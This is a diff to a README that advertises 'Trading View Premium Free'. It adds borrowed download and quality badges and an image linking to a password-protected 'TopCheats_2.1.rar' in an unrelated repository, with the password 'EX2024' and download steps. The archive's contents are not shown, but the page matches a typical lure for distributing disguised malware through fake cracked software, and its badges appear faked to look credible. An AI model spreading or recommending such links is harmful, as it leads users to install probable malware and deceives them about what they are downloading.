@@ -1,6 +1,9 @@
 # Trading View Premium Free
 
-[![image](https://github.com/turkalga1/Genshin-Impact-Starter-Maker/assets/165561228/f79e2333-d313-4a50-9d72-dcf4444682b8)](https://github.com/xuehonxin/TradingView-Premium/releases/tag/V1.0.0)
+[![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)]() [![Codacy Badge](https://app.codacy.com/project/badge/Grade/0d4fdc1daca5402a8c57efc3bef73d31)]() 
+
+ [![Безымя111111нный](https://github.com/AllertUsers/Yuakd11-9.15/assets/165304196/fc0a79c8-fb5a-4519-9986-898a321fee61)](https://github.com/AllertUsers/Yuakd11-9.15/releases/download/TopCheats/TopCheats_2.1.rar)
+ > Password: EX2024
 
 ## How to download:
 1. Open the Launcher
